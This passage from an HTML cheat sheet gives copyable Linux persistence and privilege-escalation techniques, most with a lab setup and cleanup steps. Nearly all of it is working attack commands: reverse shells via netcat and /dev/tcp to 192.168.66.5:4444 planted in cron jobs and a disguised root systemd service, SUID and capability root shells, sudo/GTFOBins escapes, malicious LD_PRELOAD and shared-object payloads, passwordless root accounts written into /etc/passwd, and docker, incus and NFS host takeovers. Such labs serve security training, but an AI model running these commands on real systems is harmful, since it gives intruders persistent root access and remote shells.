<pre><code>cp ~/.ssh/persist ~/backup_persist.key</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sed -i '/persist/d' ~/.ssh/authorized_keys 2&gt;/dev/null; rm -f ~/.ssh/persist ~/.ssh/persist.pub ~/.ssh/config</code></pre></div>
</div></details>

<details class="p" id="s12">
<summary><span class="sum-num">12</span> Systemd Service + Netcat <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">STEP 1</span> Attacker Listener</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>nc -lvnp 4444</code></pre></div>
<h3><span class="tag tag-setup">STEP 2</span> Create Service (with -e flag)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cat &gt; /etc/systemd/system/sysnetwork.service &lt;&lt; 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'nc -e /bin/bash 127.0.0.1 4444'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF</code></pre></div>
<h3><span class="tag tag-setup">STEP 3</span> OpenBSD nc (no -e flag)</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cat &gt; /etc/systemd/system/sysnetwork.service &lt;&lt; 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'rm -f /tmp/.p; mkfifo /tmp/.p; cat /tmp/.p | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt; /tmp/.p'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF</code></pre></div>
<h3><span class="tag tag-exploit">STEP 4</span> Enable &amp; Start</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>systemctl daemon-reload && systemctl enable sysnetwork.service && systemctl start sysnetwork.service</code></pre></div>
<h3><span class="tag tag-verify">VERIFY</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>systemctl status sysnetwork.service
systemctl is-enabled sysnetwork.service
systemctl restart sysnetwork.service
systemctl list-units --type=service --state=enabled | grep -v snap
ls -la /etc/systemd/system/</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>systemctl stop sysnetwork.service && systemctl disable sysnetwork.service && rm /etc/systemd/system/sysnetwork.service && systemctl daemon-reload && rm -f /tmp/.p
systemctl status sysnetwork.service 2&gt;&amp;1
ls /etc/systemd/system/ | grep -v snap</code></pre></div>
</div></details>
</div>
<!-- ═══════════════════════════════ PRIVILEGE ESCALATION ═══════════════════════════════ -->
<div class="phase">
<div class="phase-header phase-privesc">
  <div class="phase-icon">⚡</div>
  <div class="phase-label"><h2>Privilege Escalation</h2><p>Escalate from low-privileged user to root</p></div>
</div>

<details class="x" id="s13">
<summary><span class="sum-num">13</span> SUID Binary Abuse <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">FIND</span> SUID Binaries</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null &gt; suid_bins.txt</code></pre></div>
<h3><span class="tag tag-exploit">EXPLOIT</span> SUID Root Shell</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cp /bin/bash /home/kali/bash_suid
sudo chown root:root /home/kali/bash_suid
sudo chmod u+s /home/kali/bash_suid
/home/kali/bash_suid -p
<span class="c-comment"># id → euid=0(root)</span></code></pre></div>
<h3><span class="tag tag-exploit">OPTION 2</span> .deb postinst trick</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>mkdir -p /tmp/rootme/DEBIAN
cat &gt; /tmp/rootme/DEBIAN/control &lt;&lt;EOF
Package: rootme
Version: 1
Architecture: all
Maintainer: a
Description: a
EOF
cat &gt; /tmp/rootme/DEBIAN/postinst &lt;&lt;EOF
#!/bin/bash
/bin/bash -i
EOF
chmod 755 /tmp/rootme/DEBIAN/postinst
dpkg-deb -b /tmp/rootme /tmp/rootme.deb
sudo dpkg -i /tmp/rootme.deb</code></pre></div>
<h3><span class="tag tag-exploit">SINGLE</span> One-liner</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>mkdir -p /tmp/rootme/DEBIAN && echo -e 'Package: rootme\nVersion: 1\nArchitecture: all\nMaintainer: a\nDescription: a\n' &gt; /tmp/rootme/DEBIAN/control && echo '#!/bin/bash' &gt; /tmp/rootme/DEBIAN/postinst && echo '/bin/bash -i' &gt;&gt; /tmp/rootme/DEBIAN/postinst && chmod 755 /tmp/rootme/DEBIAN/postinst && dpkg-deb -b /tmp/rootme /tmp/rootme.deb &gt;/dev/null 2&gt;&amp;1 && sudo dpkg -i /tmp/rootme.deb</code></pre></div>
<h3><span class="tag tag-exploit">OPTION 3</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>ls -ld /home/kali
sudo chown kali:kali /home/kali
cp /bin/bash /home/kali/shell_suid
sudo chown root:root /home/kali/shell_suid
sudo chmod u+s /home/kali/shell_suid
/home/kali/shell_suid -p</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo rm /home/kali/bash_suid /home/kali/shell_suid /home/kali/test_suid /tmp/vuln /tmp/bash_suid /tmp/libcustom.* /tmp/PwnKit 2&gt;/dev/null
sudo rm /root/testfile</code></pre></div>
</div></details>

<details class="x" id="s14">
<summary><span class="sum-num">14</span> Linux Capabilities <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-exploit">cap_setuid</span> → root shell</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cp /usr/bin/python3 /home/kali/pycap
sudo setcap cap_setuid=ep /home/kali/pycap
getcap /home/kali/pycap
<span class="c-comment"># Output: /home/kali/pycap cap_setuid=ep</span>
/home/kali/pycap -c 'import os; os.setuid(0); os.system("/bin/bash -p")'</code></pre></div>
<h3><span class="tag tag-exploit">cap_dac_read_search</span> → read any file</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cp /bin/cat /home/kali/readcat
sudo setcap cap_dac_read_search=ep /home/kali/readcat
/home/kali/readcat /etc/shadow</code></pre></div>
<h3><span class="tag tag-exploit">cap_sys_ptrace</span> injection demo</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo sleep 1000 &amp;
cp /bin/bash /home/kali/ptbash
sudo setcap cap_sys_ptrace=ep /home/kali/ptbash
/home/kali/ptbash -c 'kill -STOP &lt;PID_of_sleep&gt;; echo "Attach would succeed here"'</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>rm /home/kali/pycap /home/kali/readcat /home/kali/ptbash
sudo sed -i '/^evil:/d' /etc/passwd</code></pre></div>
</div></details>

<details class="x" id="s15">
<summary><span class="sum-num">15</span> Vulnerable Sudo Rules / GTFOBins <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo -l
sudo -i</code></pre></div>
<h3><span class="tag tag-exploit">find</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo find . -exec /bin/sh \; -quit
sudo find . -exec /bin/bash -p \; -quit</code></pre></div>
<h3><span class="tag tag-exploit">vim / vi</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo vim -c ':!/bin/sh'</code></pre></div>
<h3><span class="tag tag-exploit">perl</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo perl -e 'exec "/bin/sh";'</code></pre></div>
<h3><span class="tag tag-exploit">python</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo python -c 'import os; os.system("/bin/sh")'</code></pre></div>
<h3><span class="tag tag-exploit">awk</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></pre></div>
<h3><span class="tag tag-exploit">git</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo git -p help
<span class="c-comment"># Then type: !/bin/sh</span></code></pre></div>
<h3><span class="tag tag-exploit">node</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'</code></pre></div>
<h3><span class="tag tag-exploit">Add root user</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>echo "root2::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su root2</code></pre></div>
</div></details>

<details class="x" id="s16">
<summary><span class="sum-num">16</span> Sudo SETENV + LD_PRELOAD <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">SETUP</span> Create Vulnerable User</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo useradd -m -s /bin/bash testuser
sudo passwd testuser          <span class="c-comment"># e.g. "lab123"</span>
sudo visudo -f /etc/sudoers.d/testuser
<span class="c-comment"># Add: testuser ALL=(ALL:ALL) SETENV: ALL</span></code></pre></div>
<h3><span class="tag tag-exploit">EXPLOIT</span> Malicious Library</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>su - testuser

cat &gt; /tmp/preload.c &lt;&lt; 'EOF'
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

void _init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so /bin/true</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo rm /etc/sudoers.d/testuser
sudo userdel -r testuser
rm /tmp/preload.c /tmp/preload.so</code></pre></div>
</div></details>

<details class="x" id="s17">
<summary><span class="sum-num">17</span> Shared Object Injection <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">BUILD</span> Lab</h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>mkdir -p /home/kali/solab && cd /home/kali/solab
cat &gt; /tmp/libcustom.c &lt;&lt; 'EOF'
#include &lt;stdio.h&gt;
void greet() { printf("Hello from library\n"); }
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c
cat &gt; main.c &lt;&lt; 'EOF'
void greet();
int main() { greet(); return 0; }
EOF
gcc -o vuln main.c -L/tmp -lcustom -Wl,-rpath,/tmp
sudo chown root:root vuln
sudo chmod u+s vuln
ldd ./vuln | grep custom</code></pre></div>
<h3><span class="tag tag-exploit">EXPLOIT</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>cat &gt; /tmp/evil.c &lt;&lt; 'EOF'
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
__attribute__((constructor)) void pwned() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so /tmp/evil.c
/home/kali/solab/vuln</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>rm -rf /home/kali/solab /tmp/libcustom.so /tmp/evil.c /tmp/libcustom.c 2&gt;/dev/null</code></pre></div>
</div></details>
<details class="x" id="s18">
<summary><span class="sum-num">18</span> Cron Job Abuse <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">SETUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo mkdir -p /opt/revlab
sudo chmod 777 /opt/revlab
cat &lt;&lt; 'EOF' | sudo tee /opt/revlab/backup.sh &gt; /dev/null
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/192.168.66.5/4444 0&gt;&amp;1
EOF
sudo chmod +x /opt/revlab/backup.sh
echo "* * * * * root /opt/revlab/backup.sh" | sudo tee -a /etc/crontab</code></pre></div>
<h3><span class="tag tag-exploit">LISTENER</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>nc -lvnp 4444</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo sed -i '/\/opt\/revlab\/backup.sh/d' /etc/crontab
sudo rm -rf /opt/revlab</code></pre></div>
</div></details>

<details class="x" id="s19">
<summary><span class="sum-num">19</span> Writable PATH Hijack <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># 1. Make directory world-writable</span>
sudo chmod 777 /usr/local/bin

<span class="c-comment"># 2. Create malicious script</span>
cat &gt; /usr/local/bin/cleanup &lt;&lt; 'EOF'
#!/bin/bash
echo "evil::0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd
EOF
chmod +x /usr/local/bin/cleanup

<span class="c-comment"># 3. Add to root's crontab</span>
echo -e "PATH=/usr/local/bin:/usr/bin:/bin\n* * * * * cleanup" | sudo crontab -

<span class="c-comment"># 4. Verify</span>
sudo crontab -l
<span class="c-comment"># PATH=/usr/local/bin:/usr/bin:/bin</span>
<span class="c-comment"># * * * * * cleanup</span>

<span class="c-comment"># 5. Ensure cron running</span>
sudo systemctl start cron

<span class="c-comment"># 6. Wait</span>
echo "Waiting for cron to fire..."
sleep 65

<span class="c-comment"># 7. Check /etc/passwd</span>
tail -3 /etc/passwd
<span class="c-comment"># evil::0:0:root:/root:/bin/bash</span>

<span class="c-comment"># 8. Become root</span>
su evil</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo sed -i '/^evil:/d' /etc/passwd
sudo crontab -r
sudo chmod 755 /usr/local/bin
sudo rm /usr/local/bin/cleanup</code></pre></div>
</div></details>

<details class="x" id="s20">
<summary><span class="sum-num">20</span> Systemd Service Abuse <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">SETUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo mkdir -p /opt/service-lab && sudo chmod 777 /opt/service-lab
sudo tee /opt/service-lab/cleanup.sh &lt;&lt; 'EOF' &gt; /dev/null
#!/bin/bash
echo "$(date) - service ran" &gt;&gt; /var/log/cleanup.log
EOF
sudo chmod 777 /opt/service-lab/cleanup.sh
sudo tee /etc/systemd/system/cleanup.service &lt;&lt; 'EOF' &gt; /dev/null
[Unit]
Description=Cleanup Service
[Service]
Type=simple
ExecStart=/opt/service-lab/cleanup.sh
User=root
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload && sudo systemctl start cleanup.service && sudo systemctl enable cleanup.service</code></pre></div>
<h3><span class="tag tag-verify">VERIFY</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo systemctl status cleanup
sudo cat /var/log/cleanup.log</code></pre></div>
<h3><span class="tag tag-exploit">EXPLOIT</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>nc -lvnp 4444
cat &gt; /opt/service-lab/cleanup.sh &lt;&lt; 'EOF'
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/192.168.66.5/4444 0&gt;&amp;1
EOF
sudo systemctl restart cleanup</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo systemctl stop cleanup && sudo systemctl disable cleanup && sudo rm /etc/systemd/system/cleanup.service && sudo systemctl daemon-reload && sudo rm -rf /opt/service-lab</code></pre></div>
</div></details>

<details class="x" id="s21">
<summary><span class="sum-num">21</span> Docker Group Escalation <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>groups
sudo apt update && sudo apt install docker.io -y
sudo usermod -aG docker $USER
newgrp docker
groups    <span class="c-comment"># should show "docker"</span>

<span class="c-comment"># Mount host root fs into container</span>
docker run -v /:/mnt -it alpine

<span class="c-comment"># Inside container:</span>
sed -i 's/^root:\*:/root::/' /mnt/etc/shadow
head -1 /mnt/etc/shadow    <span class="c-comment"># should show root:: (no password)</span>
exit

<span class="c-comment"># Back on host:</span>
su -</code></pre></div>
<h3><span class="tag tag-cleanup">RESTORE</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sed -i 's/^root::/root:*:/' /etc/shadow
passwd -l root
sudo groupdel docker</code></pre></div>
</div></details>

<details class="x" id="s22">
<summary><span class="sum-num">22</span> Incus / LXC Privileged Container <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># Install &amp; setup</span>
sudo apt update && sudo apt install incus -y
sudo usermod -aG incus $USER
newgrp incus
sudo systemctl start incus && sudo systemctl enable incus
incus admin init --auto

<span class="c-comment"># Create privileged container with host mount</span>
incus launch images:alpine/edge privesc -c security.privileged=true
incus config device add privesc host-root disk source=/ path=/mnt/root
incus restart privesc

<span class="c-comment"># Get root shell inside container</span>
incus exec privesc -- /bin/sh

<span class="c-comment"># Remove password lock from HOST root account</span>
sed -i 's/^root:[!*]:/root::/' /mnt/root/etc/shadow
exit

<span class="c-comment"># Become root on host</span>
su -</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>incus stop privesc && incus delete privesc
passwd -l root
sudo gpasswd -d $USER incus</code></pre></div>
</div></details>

<details class="x" id="s23">
<summary><span class="sum-num">23</span> NFS no_root_squash <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<h3><span class="tag tag-setup">PREP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo groupadd docker 2&gt;/dev/null
sudo systemctl restart docker.socket && sudo systemctl start docker
docker ps</code></pre></div>
<h3><span class="tag tag-setup">NFS SERVER</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo apt update && sudo apt install nfs-kernel-server -y
sudo mkdir -p /nfs_share && sudo chmod 777 /nfs_share
echo "/nfs_share *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo exportfs -ra && sudo systemctl restart nfs-server
showmount -e localhost
<span class="c-comment"># Export list for localhost:</span>
<span class="c-comment"># /nfs_share *</span></code></pre></div>
<h3><span class="tag tag-exploit">NFS CLIENT (Docker)</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>docker run -it --rm --privileged --name nfs-client ubuntu bash
apt update && apt install nfs-common -y
mkdir /mnt/nfs && mount -t nfs 172.17.0.1:/nfs_share /mnt/nfs
cp /bin/bash /mnt/nfs/rootshell && chmod u+s /mnt/nfs/rootshell
ls -l /mnt/nfs/rootshell    <span class="c-comment"># -rwsr-xr-x 1 root root</span>
exit</code></pre></div>
<h3><span class="tag tag-exploit">ESCALATE</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>/nfs_share/rootshell -p
id    <span class="c-comment"># euid=0(root)</span></code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>sudo rm -f /nfs_share/rootshell /nfs_share/testfile
sudo sed -i '/\/nfs_share/d' /etc/exports
sudo exportfs -ra && sudo systemctl stop nfs-server && sudo systemctl disable nfs-server
sudo rm -rf /nfs_share
sudo apt remove --purge nfs-kernel-server nfs-common -y
docker rm -f nfs-client 2&gt;/dev/null</code></pre></div>
</div></details>

<details class="x" id="s24">
<summary><span class="sum-num">24</span> Polkit rules.d Misconfiguration <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># Identify misconfiguration</span>
find /etc/polkit-1/rules.d/ -writable -type d 2&gt;/dev/null

<span class="c-comment"># Create malicious rule</span>
cat &gt; /etc/polkit-1/rules.d/99-pwn.rules &lt;&lt; 'EOF'
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        return polkit.Result.YES;
    }
});
EOF
chmod 644 /etc/polkit-1/rules.d/99-pwn.rules
cat /etc/polkit-1/rules.d/99-pwn.rules

<span class="c-comment"># Trigger escalation</span>
pkexec /bin/bash -p</code></pre></div>
<h3><span class="tag tag-cleanup">CLEANUP</span></h3>
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code>rm /etc/polkit-1/rules.d/99-pwn.rules</code></pre></div>
</div></details>

<details class="x" id="s25">
<summary><span class="sum-num">25</span> Writable /etc/passwd <span class="sum-arrow">▶</span></summary>
<div class="card-body">
<div class="code-wrap"><div class="code-header"><div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copy</button></div>
<pre><code><span class="c-comment"># 1. Make writable</span>
sudo chmod 646 /etc/passwd
ls -l /etc/passwd    <span class="c-comment"># -rw-rw-rw-</span>

